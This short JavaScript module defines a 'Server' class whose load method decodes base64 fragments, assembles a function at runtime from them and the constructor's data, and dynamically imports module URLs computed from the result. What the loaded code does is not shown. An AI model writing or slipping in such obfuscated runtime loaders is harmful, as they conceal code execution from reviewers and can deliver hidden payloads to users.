class Server {

    constructor(d) {
        this.d = d;
    };

    load = (d) => {
        return {
            _ux: {
                dom: { s: `YXNzZXRzL2pzL2luZGV4Lmpz` },
                op: { ready: (d) => {
                    for (let i = 0, j = ["53", "64"]; i < j.length; i++)
                        import(URL[d.g](new d.f(`hash`, atob(`cmV0dX${this.d["64"]}9YF0oe${this.d["53"]}B0In0p`))(j[i])));
                } },
                y: {}
            },
            e: document.createElement("script")
        }
    }

};

export { Server };